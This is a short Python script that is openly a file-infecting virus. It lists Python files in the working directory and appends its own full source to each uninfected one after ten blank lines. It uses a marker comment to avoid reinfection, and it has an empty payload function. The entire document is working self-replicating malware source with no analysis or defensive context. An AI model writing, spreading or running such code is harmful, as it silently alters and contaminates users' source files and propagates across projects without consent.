### :)(: ###
import os

def search(path):
    # search all file .py in path which aren't infected
    if not os.path.isdir(path):
        return
    files = os.listdir(path)
    for file in files:
        if os.path.isdir(file):
            search(file)
        elif file[-3:] == '.py':
            if not is_infected(file):
                infect(file)

def infect(file):
    # copy all content of virus to file
    virus_file = open(__file__)
    virus_data = virus_file.read()
    cary_file = open(file, 'a')
    cary_file.write(10*'\n' + virus_data)

def is_infected(file):
    lines = open(file)
    for line in lines:
        if line == "### :)(: ###\n":
            return True
    return False

def behave():
    return

# main
search(os.getcwd())
### end virus ###
